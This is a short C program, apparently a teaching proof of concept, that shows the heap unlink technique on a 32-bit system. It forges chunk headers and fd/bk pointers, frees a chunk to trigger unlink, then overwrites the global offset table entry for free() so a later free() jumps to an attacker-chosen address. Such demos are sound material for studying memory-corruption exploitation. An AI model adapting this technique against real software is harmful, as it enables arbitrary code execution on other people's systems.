```c
#include "stdio.h"
#include "stdlib.h"
#include "sys/socket.h"
#include "netinet/in.h"

char *array[5];

int main(int argc, void *argv[])
{
	printf("array addr = %08x\r\n", array);

	array[0] = (char*)malloc(0x40);
	array[1] = (char*)malloc(0x40);
	array[2] = (char*)malloc(0x40);
	array[3] = (char*)malloc(0x40);
	array[4] = (char*)malloc(0x40);

	free(array[1]);
	free(array[3]);
	
	*(int*)&array[0][0x40] = 0x48; //fake prev_size
	*(int*)&array[0][0x44] = 0x51; //fake size

	*(int*)&array[2][0] = 0x50; //fake prev_size
	*(int*)&array[2][4] = 0x11; //fake size, PREV_INUSE = 1
	*(int*)&array[2][8] = (int)&array[2] - 3 * 4; //faked fd
	*(int*)&array[2][0xc] = (int)&array[2] - 2 * 4; //faked bk
	*(int*)&array[2][0x10] = 0x10; //fake prev_size 
	*(int*)&array[2][0x14] = 0x10; //fake size, PREV_INUSE = 0

	free(array[1]); //unlink, overwrite array[2]

	memcpy(array[2], "\xaa\xbb\xcc\xdd\x10\xa0\x04\x08", 8); //overwrite array[0] by array[2] with GOT addr 0x0804a010

	memcpy(array[0], "\xdd\xdd\xdd\xdd", 4); //overwrite free() of GOT

	free(array[4]); //call free, actually call 0xdddddddd

	return 0;
}



```
